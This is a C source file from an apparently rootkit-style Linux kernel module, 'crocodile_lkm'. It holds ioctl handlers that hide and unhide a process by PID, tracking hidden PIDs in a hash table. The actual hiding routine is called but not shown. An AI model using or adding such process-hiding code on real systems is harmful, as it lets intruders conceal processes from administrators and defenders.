/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "logging.h"
#include "ctrl/proc.h"
#include "device/details/hash_tbl.h"
#include "device/details/ioctl_cmd.h"

int ioc_hide_pid(module_dev_t* p_dev, pid_t pid)
{
    int rc = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: invalid pid");
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: failed to lock mutex");
        return -ERESTARTSYS;
    }
    rc = hash_tbl_insert(&p_dev->hash_tbl, pid);
    if (rc == 0) {
        rc = process_hide(pid);
        if (rc != 0) {
            hash_tbl_erase(&p_dev->hash_tbl, pid);
        }
    }
    mutex_unlock(&p_dev->lock);
    KLOG_DEBUG(LOG_PREFIX "device::ioc_hide_pid: hid process result %d", rc);
    return rc;
}

int ioc_show_pid(module_dev_t* p_dev, pid_t pid)
{
    int rc = 0;

    if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: invalid pid");
        return -ESRCH;  /* No such process */
    }

    if (mutex_lock_interruptible(&p_dev->lock)) {
        KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: failed to lock mutex");
        return -ERESTARTSYS;
    }
    rc = hash_tbl_erase(&p_dev->hash_tbl, pid);
    if (rc == 0) {
        rc = process_show(pid);
    }
    mutex_unlock(&p_dev->lock);
    KLOG_DEBUG(LOG_PREFIX "device::ioc_show_pid: hid process result %d", rc);
    return rc;
}

